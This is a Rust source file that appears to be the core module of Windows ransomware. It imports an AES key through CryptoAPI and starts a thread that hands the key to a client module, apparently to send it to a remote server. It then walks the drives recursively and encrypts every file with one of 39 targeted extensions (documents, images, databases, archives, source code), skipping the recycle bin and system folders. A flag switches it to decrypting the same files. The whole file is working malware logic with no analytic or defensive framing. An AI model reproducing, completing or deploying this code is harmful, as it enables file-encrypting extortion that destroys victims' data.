use crate::EncryptionDecryption;
use std::ptr::null_mut;
use winapi::um::wincrypt::{
    CryptAcquireContextA, CryptDestroyKey, CryptExportKey, CryptImportKey,
    CryptReleaseContext, CRYPT_EXPORTABLE, CRYPT_VERIFYCONTEXT, HCRYPTKEY,
    HCRYPTPROV, PLAINTEXTKEYBLOB, PROV_RSA_AES,
};
use std::ptr;
use std::ffi::{CString, CStr};
use winapi::um::fileapi::{FindClose, FindFirstFileA, FindNextFileA};
use winapi::um::minwinbase::WIN32_FIND_DATAA;
use winapi::um::winbase::GetLogicalDriveStringsA;
use std::mem;
use std::path::Path;
use std::thread;
use crate::Client;

fn check(path: &str) -> i16 {
    let file_type: [&str; 39] = [
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".jpg", ".png", 
        ".jpeg", ".bmp", ".gif", ".mp3", ".wav", ".mp4", ".mkv", ".avi", ".mdb", ".accdb", 
        ".sql", ".db", ".sqlite", ".zip", ".rar", ".7z", ".java", ".cpp", ".py", ".js", 
        ".html", ".css", ".rb", ".bak", ".tar",".CR2",".csv",".ps1",".cpp"
    ];

    if path.contains("$RECYCLE.BIN") || path.contains("System Volume Information") {
        return -3;
    }

    let path = Path::new(path);

    if !path.exists() {
        return -1; 
    }

    if path.is_file() {
        let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
        if file_type.contains(&format!(".{}", ext).as_str()) {
            return 1; 
        } else {
            return -4; 
        }
    } else if path.is_dir() {
        return 0; 
    } else {
        return -2; 
    }
}

pub fn csp(choice: bool,BLOB_BUFFER:[u8; 36])->i32 {

    let mut h_crypt_prov: HCRYPTPROV = 0;
    let mut h_key: HCRYPTKEY = 0;

    unsafe {
        if choice {
            let client= thread::spawn(move || {
                let res= Client::client(BLOB_BUFFER);
            });
        }
        if CryptAcquireContextA(
            &mut h_crypt_prov,
            ptr::null_mut(),
            ptr::null_mut(),
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT,
        ) == 0 {
            return 0;
        }

        if CryptImportKey(
            h_crypt_prov,
            BLOB_BUFFER.as_ptr(),
            BLOB_BUFFER.len() as u32,
            0,
            CRYPT_EXPORTABLE,
            &mut h_key,
        ) == 0 {
            return 0;
        } 

        let mut blob_length: u32 = 0;
        if CryptExportKey(h_key, 0, PLAINTEXTKEYBLOB, 0, null_mut(), &mut blob_length) == 0 {
            CryptDestroyKey(h_key);
            CryptReleaseContext(h_crypt_prov, 0);
            return 0;
        } 

        let mut blob_buff: Vec<u8> = vec![0u8; blob_length as usize];
        if CryptExportKey(
            h_key,
            0,
            PLAINTEXTKEYBLOB,
            0,
            blob_buff.as_mut_ptr(),
            &mut blob_length,
        ) == 0
        {
            CryptDestroyKey(h_key);
            CryptReleaseContext(h_crypt_prov, 0);
            return 0;
        } 
        const BUFFER_SIZE:usize=256;
        let mut buffer = [0u8; BUFFER_SIZE];

        let len = GetLogicalDriveStringsA(BUFFER_SIZE as u32, buffer.as_mut_ptr() as *mut i8);
        let mut start = 0;
        for i in 0..len as usize {
            if buffer[i] == 0 {
                if start != i {
                    let drive = CStr::from_bytes_with_nul(&buffer[start..=i]).unwrap();
                    if &drive.to_string_lossy()[0..2] == "C:"{
                        traverse_directory("F:",choice,h_key);
                    }
                }
                start = i + 1;
            }
        }
        CryptDestroyKey(h_key);
        CryptReleaseContext(h_crypt_prov, 0);
        return 1;
    }
}

fn traverse_directory(path:&str,choice:bool,h_key: HCRYPTKEY) {
    let search_path = format!("{}\\*", path);
    let c_search_path = CString::new(search_path).expect("Invalid directory");
    unsafe {
        let mut find_data: WIN32_FIND_DATAA = mem::zeroed();
        let handle = FindFirstFileA(c_search_path.as_ptr(), &mut find_data);
        if handle == std::ptr::null_mut() {
            return;
        }
        loop {
            let file_name = CStr::from_ptr(find_data.cFileName.as_ptr()).to_string_lossy();
            if file_name == "." || file_name == ".." {
                if FindNextFileA(handle, &mut find_data) == 0 {
                    break;
                }
                continue;
            }
            let full_path = format!("{}\\{}", path, file_name);
            let check_result = check(&full_path);
            match check_result {
                1 => {
                    match choice{
                        true => {
                            let file_path=CString::new(full_path.clone()).unwrap();
                            let encrypted_file_path = EncryptionDecryption::encryption(file_path,h_key);
                        }
                        false => {
                            let file_path=CString::new(full_path.clone()).unwrap();
                            let decrypted_file_path = EncryptionDecryption::decrypt_file(file_path,h_key);
                        }
                    }
                },
                0 => {
                    traverse_directory(&full_path,choice,h_key);
                }
                _ => {},
            }
            if FindNextFileA(handle, &mut find_data) == 0 {
                break;
            }
        }
        FindClose(handle);
    }
}
